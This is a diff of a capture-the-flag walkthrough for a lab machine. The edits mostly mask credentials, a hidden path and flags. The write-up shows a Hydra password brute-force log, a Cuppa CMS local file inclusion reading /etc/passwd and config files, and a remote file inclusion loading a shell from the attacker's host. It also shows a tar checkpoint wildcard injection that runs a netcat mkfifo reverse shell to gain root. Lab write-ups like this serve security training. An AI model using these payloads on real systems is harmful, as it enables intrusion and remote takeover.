@@ -180,21 +180,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-24 06:59:
 [DATA] attacking http-post-form://10.10.250.118:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect.
 [ATTEMPT] target 10.10.250.118 - login "milesdyson" - pass "cyborg007haloterminator" - 1 of 31 [child 0] (0/0)
 [ATTEMPT] target 10.10.250.118 - login "milesdyson" - pass "terminator22596" - 2 of 31 [child 1] (0/0)
-[ATTEMPT] target 10.10.250.118 - login "milesdyson" - pass "terminator219" - 3 of 31 [child 2] (0/0)
-[ATTEMPT] target 10.10.250.118 - login "milesdyson" - pass "terminator20" - 4 of 31 [child 3] (0/0)
-[ATTEMPT] target 10.10.250.118 - login "milesdyson" - pass "terminator1989" - 5 of 31 [child 4] (0/0)
-[ATTEMPT] target 10.10.250.118 - login "milesdyson" - pass "terminator1988" - 6 of 31 [child 5] (0/0)
-[ATTEMPT] target 10.10.250.118 - login "milesdyson" - pass "terminator168" - 7 of 31 [child 6] (0/0)
-[ATTEMPT] target 10.10.250.118 - login "milesdyson" - pass "terminator16" - 8 of 31 [child 7] (0/0)
-[ATTEMPT] target 10.10.250.118 - login "milesdyson" - pass "terminator143" - 9 of 31 [child 8] (0/0)
-[ATTEMPT] target 10.10.250.118 - login "milesdyson" - pass "terminator13" - 10 of 31 [child 9] (0/0)
-[ATTEMPT] target 10.10.250.118 - login "milesdyson" - pass "terminator123!@#" - 11 of 31 [child 10] (0/0)
-[ATTEMPT] target 10.10.250.118 - login "milesdyson" - pass "terminator1056" - 12 of 31 [child 11] (0/0)
-[ATTEMPT] target 10.10.250.118 - login "milesdyson" - pass "terminator101" - 13 of 31 [child 12] (0/0)
-[ATTEMPT] target 10.10.250.118 - login "milesdyson" - pass "terminator10" - 14 of 31 [child 13] (0/0)
-[ATTEMPT] target 10.10.250.118 - login "milesdyson" - pass "terminator02" - 15 of 31 [child 14] (0/0)
-[ATTEMPT] target 10.10.250.118 - login "milesdyson" - pass "terminator00" - 16 of 31 [child 15] (0/0)
-[80][http-post-form] host: 10.10.250.118   login: milesdyson   password: cyborg007haloterminator
+[...]
+[80][http-post-form] host: 10.10.250.118   login: milesdyson   password: **************************
 1 of 1 target successfully completed, 1 valid password found
 [WARNING] Writing restore file because 1 final worker threads did not complete until end.
 [ERROR] 1 target did not resolve or could not be connected
@@ -206,14 +193,14 @@ We found the credentials !
 
 So, at this points we have :
 ID : milesdyson
-PW : cyborg007haloterminator
+PW : *****************
 
 We can connect to squirrel
 
 ## Lets founds somes password !
 We are connected, we have 3 mails, 1 mail with a new password for milesdyson 
 
-)s{A&2Z=F^n_E.B`
+)s{************
 
 We can use this password in samba to get file of miles dyson.
 
@@ -221,13 +208,13 @@ We reconnect to smb using miles dyson credentials :
 
 
 we found a file named "important.txt" it talk about hidden page 
-/45kra24zxs28v3yd
+/45kr*********
 
 This page displays a photo of miler dyson
 
 Lets try a gobuster again on this page :
 ```
-gobuster dir -u http://10.10.250.118/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster dir -u http://10.10.250.118/45kr**********/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
 Result: 
@@ -237,7 +224,7 @@ Result:
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://10.10.250.118/45kra24zxs28v3yd/
+[+] Url:                     http://10.10.250.118/45kr***********/
 [+] Method:                  GET
 [+] Threads:                 10
 [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
@@ -247,7 +234,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 Starting gobuster in directory enumeration mode
 ===============================================================
-/administrator        (Status: 301) [Size: 339] [--> http://10.10.250.118/45kra24zxs28v3yd/administrator/]
+/administrator        (Status: 301) [Size: 339] [--> http://10.10.250.118/45kr*********/administrator/]
 Progress: 87664 / 87665 (100.00%)
 ===============================================================
 Finished
@@ -263,7 +250,7 @@ After quick google, we found an LFI on this CMS, lets try to exploit it.
 With this payload we can see its vulnerable :
 
 ```
-http://10.10.250.118/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+http://10.10.250.118/45kr**********/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
 ```
 Result :
 ```
@@ -274,7 +261,7 @@ root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
 We try other payload to get the configuration file of CUPPA CMS:
 
 ```
-http://10.10.250.118/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
+http://10.10.250.118/45kr************/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
 ```
 
 Result :
@@ -308,7 +295,7 @@ We need to decode this base64, here the result:
 
 We can get the user flag with this LFI :
 ```
-http://10.10.250.118/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../home/milesdyson/user.txt
+http://10.10.250.118/45kr**************/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../home/milesdyson/user.txt
 ```
 Result:
 ```
@@ -325,7 +312,7 @@ nc -lnvp 4444
 Then, exploit a RFI to upload a shell:
 
 ```
-http://10.10.250.118/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://{MY_IP}/shell.php
+http://10.10.250.118/45kr**************/administrator/alerts/alertConfigField.php?urlConfig=http://{MY_IP}/shell.php
 ```
 We now have the reverse shell on the server as www-data !
 
@@ -365,7 +352,7 @@ As we can see, this script go on /var/www/html and use the command tar to archiv
 ```
 
 we can exploit tar to get a root shell.
-Tar can use wildcards, there are “checkpoint” flags, which allow you to execute actions after a specified number of files have been archived. 
+Tar can use wildcards, there are “checkpoint” flags, which allow you to execute actions and commands after a specified number of files have been archived. 
 i'm gonna create a checkpoint in /var/www/html folder
 
 1. I open a listerner
@@ -377,8 +364,8 @@ nc -lnvp 1234
 first, we create the checkpoint and the revshell:
 
 ```
-touch -- --checkpoint=1
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {MY_IP} 1234 >/tmp/f" > shell.sh
+touch -- --checkpoint=1
 touch -- "--checkpoint-action=exec=sh shell.sh"
 ```
 
@@ -396,4 +383,5 @@ We can get the root flag
 
 cat /root/root.txt
 
+3f0372*****************
 3f03***********************
